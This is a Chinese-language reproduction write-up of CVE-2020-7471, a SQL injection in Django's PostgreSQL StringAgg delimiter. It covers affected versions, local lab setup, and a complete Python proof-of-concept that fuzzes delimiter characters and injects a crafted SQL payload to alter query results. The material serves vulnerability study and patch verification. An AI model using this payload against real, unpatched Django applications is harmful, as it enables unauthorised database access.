<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-7471）Django sql注入漏洞</h1><h2>一、漏洞简介</h2><p>Django是高水准的由Python编程语言驱动的一个开源Web应用程序框架，起源于开源社区。使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序，应用广泛。2020年2月初，Django 官方发布安全通告公布了一个通过StringAgg（分隔符）实现利用的潜在SQL注入漏洞（CVE-2020-7471）。攻击者可通过构造分隔符传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义并注入恶意SQL语句</p><h2>二、漏洞影响</h2><p>Django 1.11.x &lt; 1.11.28<br />Django 2.2.x &lt; 2.2.10<br />Django 3.0.x &lt; 3.0.3<br />Django 主开发分支</p><h2>三、复现过程</h2><h3>环境安装</h3><ol class="pydocx-list-style-type-decimal"><li>安装 django 漏洞版本，我测试用的是</li></ol><ul><li>pip install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple</li></ul><ol class="pydocx-list-style-type-decimal"><li>参考 https://www.runoob.com/postgresql/windows-install-postgresql.html 完成 postgres 数据库的安装</li><li>新建数据库</li></ol><ul><li>CREATE DATABASE test;</li></ul><ol class="pydocx-list-style-type-decimal"><li>修改 sqlvul_projects/settings.py 里面的数据库配置，如果上一步你安装用的默认配置（包括设置密码为postgres），就无需修改任何配置，可以跳过这一步</li></ol><ul><li>DATABASES = {<br />    'default': {<br />        'ENGINE': 'django.db.backends.postgresql',<br />        'NAME': 'test',         # 数据库名称<br />        'USER': 'postgres',<br />        'PASSWORD': 'postgres', # 数据库用户密码<br />        'HOST': '127.0.0.1',    # 数据库地址<br />        'PORT': '5432',<br />    }<br />}</li></ul><ol class="pydocx-list-style-type-decimal"><li>通过 django 初始化数据表</li></ol><ul><li>python3 manage.py migrate<br />python3 manage.py makemigrations vul_app<br />python3 manage.py migrate vul_app</li></ul><h3>poc</h3><p># encoding:utf-8<br />import os<br />import django<br />os.environ.setdefault("DJANGO_SETTINGS_MODULE", "sqlvul_project.settings")<br /><br /># Django 版本大于等于1.7的时候，需要加上下面两句<br />if django.VERSION &gt;= (1, 7):#自动判断版本<br />    django.setup()<br /><br />from vul_app.models import Info<br />from django.contrib.postgres.aggregates import StringAgg<br />from django.db.models import Count<br /><br />"""<br />postgres 预先执行的SQL<br />CREATE DATABASE test;<br />\c test;<br />\d 列出当前数据库的所有表格<br />"""<br /><br />def initdb():<br />    data = [('li','male'),('zhao','male'),('zhang','female')]<br />    for name,gender in data:<br />        Info.objects.get_or_create(name=name,gender=gender)<br /><br />def query():<br />    # FUZZ delimiter<br />    error_c = []<br />    other_error_c = []<br />    for c in &quot;!@#$%^&amp;*()_+=-|\\\&quot;':;?/&gt;.&lt;,{}[]&quot;:<br />        results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name',delimiter=c))<br />        try:<br />            for e in results:<br />                pass<br />        except IndexError:<br />            error_c.append(c)<br />        except:<br />            other_error_c.append(c)<br />    print(error_c)<br />    print(other_error_c)<br /><br />def query_with_evil():<br />    '''<br />    注入点证明<br />    分别设置delimiter为 单引号 二个单引号 二个双引号<br />    尝试注释后面的内容 ')--<br />    :return:<br />    '''<br />    print("[+]正常的输出：")<br />    payload = '-'<br />    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=payload))<br />    for e in results:<br />        print(e)<br />    print("[+]注入后的的输出：")<br />    payload = '-\') AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- '<br />    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=payload))<br />    for e in results:<br />        print(e)<br /><br /><br /><br />if __name__ == '__main__':<br />    print(django.VERSION) # 测试版本 3.0.2<br />    initdb()<br />    query()<br />    query_with_evil()</p><p>然后运行 POC 脚本CVE-2020-7471.py就可以了</p><p>漏洞环境及其poc下载地址：https://github.com/ianxtianxt/CVE-2020-7471</p></body></html>